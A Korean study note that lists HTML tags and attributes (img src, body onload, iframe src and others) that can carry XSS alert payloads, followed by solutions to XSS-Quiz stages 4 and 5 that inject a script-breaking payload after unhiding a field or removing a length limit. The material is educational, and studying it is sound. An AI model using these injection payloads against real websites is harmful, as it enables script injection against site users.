### HTML tags for XSS

1. img
    ```html
      <img src="javascript:alert('Hello World!');">
      <img dynsrc="javascript:alert('Hello World!');">
      <img lowsrc="javascript:alert('Hello World!');">
    ```
    위와 같이 `src`, `dynsrc`, `lowsrc`에 자바스크립트 코드를 넣음으로써 XSS 공격을 할 수 있다.
  
2. input
    ```html
      <input type="image" src="javascript:alert('Hello World!');">
    ```
    이미지 태그와 비슷한 느낌인 듯 싶다. 
 
3. body
    ```html
      <body background="javascript:alert('Hello World!');">
      <body onload=alert('XSS')>
    ```
    마찬가지로, 이미지를 넣을 때 해당 소스에 자바스크립트 코드를 넣을 수 있다.

    혹은, `onload` 이벤트 핸들러에 자바스크립트 코드를 넣을 수 있다.
 
4. link
    ```html
      <link rel="stylesheet" href="javscript:alert('Hello World!');">
    ```
    CSS 파일을 불러오는 데에 사용하는 `link` 태그 또한 사용할 수 있다. 원래 CSS파일의 위치가 들어가는 곳에 자바스크립트 코드를 넣을 수 있다.

5. iframe
    ```html
      <iframe src="javascript:alert('Hello World!');"></iframe>
    ```
    `src` 위치에 자바스크립트 코드를 넣을 수 있다.

### Reference

https://jjadmin.tistory.com/24

### XSS-Quiz Stage #4

잘 보면 `p3`라는 이름을 가진 보이지 않는 `input`이 존재한다. 이 태그의 `value`에 값을 넣고 버튼을 누르면 그 값이 유지된다.

즉, 해당 태그의 `type="hidden"`을 지워서 보이게 한 뒤에 아래를 입력하면 된다.

```
"><script>alert(document.domain);</script>
```

### XSS-Quiz Stage #5

`p1`라는 이름을 가진 `input`에 값을 입력하고 버튼을 누르면 `value`에 나오게 된다. 즉, 아래의 코드를 입력하면 된다는 뜻이다.

```
"><script>alert(document.domain);</script>
```

하지만, `maxlength="15"` 때문이 입력되지 않는다. 지우고 위 코드를 입력하면 된다.
